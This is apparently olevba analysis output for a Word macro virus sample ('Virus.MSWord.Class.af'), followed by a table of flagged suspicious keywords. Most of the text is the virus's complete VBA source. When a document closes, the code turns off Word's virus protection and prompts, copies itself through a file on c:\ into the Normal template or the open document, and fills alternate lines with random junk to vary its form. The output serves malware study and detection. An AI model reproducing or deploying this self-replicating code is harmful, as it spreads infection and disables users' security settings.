olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.af
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.af - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
Options.ConfirmConversions = 0
UIL = QBN + KGN
Application.EnableCancelKey = 0
OFG = SSM + VUE
VB39 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
PVF = LCV + OAM
SG69 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
CCR = GBG + IGU
Options.SaveNormalPrompt = 0
VIG = DDO + JJP
Options.VirusProtection = 0
HNE = EMB + KTF
If SG69 > 0 And VB39 > 0 Then GoTo GV13
RIG = UNN + JCM
If SG69 = 0 Then
PUS = ALU + JOL
Set DQ55 = ActiveDocument.VBProject.VBComponents.Item(1)
LKH = IFB + FVB
UV96 = True
IIK = DKF + NLD
End If
UOL = ICR + KQN
If VB39 = 0 Then
SAE = BCH + CAL
Set DQ55 = NormalTemplate.VBProject.VBComponents.Item(1)
OLS = BEO + JHD
IR69 = True
PUL = BQI + KKE
End If
HCM = DUC + JGT
If IR69 = True Then
QGO = FBA + HRG
ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\" & Application.UserInitials
FKF = HAK + ETM
DQ55.CodeModule.AddFromFile ("c:\" & Application.UserInitials)
QUH = LBN + JVC
DQ55.CodeModule.deletelines 1, 4
UNH = DKE + VCA
DQ55.CodeModule.replaceline 1, "Sub Document_Close()"
HMU = LIS + SOP
ElseIf UV96 = True Then
VHK = JPD + JLR
DQ55.CodeModule.AddFromFile ("c:\" & Application.UserInitials)
LJL = FNK + OTI
DQ55.CodeModule.deletelines 1, 4
GGD = LEM + HTK
End If
EPQ = NRD + REV
With DQ55.CodeModule
BBR = IKC + CDB
For x = 2 To (DQ55.CodeModule.CountOfLines - 1) Step 2
PLM = EKQ + QIT
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
QBN = PAJ + IGV
Next x
RPJ = QGH + JUC
End With
OHC = EBJ + VLK
GV13:
VEI = IGL + DLV
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

